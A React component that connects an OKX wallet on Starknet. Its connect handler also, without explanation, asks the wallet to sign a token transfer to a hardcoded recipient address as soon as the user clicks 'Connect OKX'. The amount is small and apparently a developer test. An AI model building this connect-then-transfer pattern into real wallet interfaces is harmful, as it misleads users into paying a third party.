import React, { useState, useEffect } from 'react';
import { Wallet } from 'lucide-react';
import { OKXUniversalConnectUI } from "@okxconnect/ui";

const OKXConnect = ({ onWalletSelected }: { onWalletSelected : any }) => {
  const [universalUi, setUniversalUi] = useState<OKXUniversalConnectUI | null>(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    initializeOKX();
  }, []);

  const initializeOKX = async () => {
    try {
      const ui = await OKXUniversalConnectUI.init({
        dappMetaData: {
          icon: "https://static.okx.com/cdn/assets/imgs/247/58E63FEA47A2B7D7.png",
          name: "DApp Connect"
        },
        actionsConfiguration: {
          modals: 'all',
          tmaReturnUrl: 'back'
        },
        language: "en_US",
        uiPreferences: {
          theme: "LIGHT"
        },
      });
      const walletInfo = ui.getWallets();
      console.log(walletInfo)
      setUniversalUi(ui);
    } catch (err) {
      setError('Failed to initialize OKX');
      console.error(err);
    }
  };

  const handleConnect = async () => {
    if (!universalUi) return;
    setIsConnecting(true);
    setError('');
    
    try {
      const session = await universalUi.openModal({
        namespaces: {
            starknet: {
            chains: ["starknet:SN_MAIN"],
       
          }
        },
        optionalNamespaces: {
          starknet: {
            chains: ["SN_MAIN"]
          }
        }
      });

      onWalletSelected(session);

      const starknetCall = {
        method: "starknet_invoke",
        params: [{
          contractAddress: "0x049d36570d4e46f48e99674bd3fcc84644ddd6b96f7c741b1562b82f9e004dc7",
          entrypoint: "transfer", 
          calldata:[
            "236175737230686010896457262423029057218074597799739621346773074352500916236",
            "10000000000000",
            "0"
        ]
        }]
      };
      
      const result = await universalUi.request(starknetCall, "starknet:SN_MAIN", "all");
      
      // Set up event listeners
      universalUi.on('session_update', (updatedSession: any) => {
        onWalletSelected(updatedSession);
      });

      universalUi.on('session_delete', () => {
        onWalletSelected(null);
      });

    } catch (err) {
      setError('Failed to connect wallet');
      console.error(err);
    } finally {
      setIsConnecting(false);
    }
  };

  const handleRequest = async (data: any) => {
    if (!universalUi) return;


    let chain ='eip155:1'


    
    try {
      

        var personalSignResult = await universalUi.request(data, chain,'all')

    } catch (err) {
      setError('Failed to connect wallet');
      console.error(err);
    } finally {
      setIsConnecting(false);
    }
  };
  return (
    <div className="flex flex-col items-center space-y-2">
      <button 
        onClick={handleConnect}
        disabled={isConnecting || !universalUi}
        className="flex items-center gap-2 px-4 py-2 font-semibold text-white bg-blue-600 rounded-lg hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed"
      >
        <Wallet className="w-4 h-4" />
        {isConnecting ? 'Connecting...' : 'Connect OKX'}
      </button>
      {error && <p className="text-sm text-red-500">{error}</p>}
    </div>
  );
};

export default OKXConnect;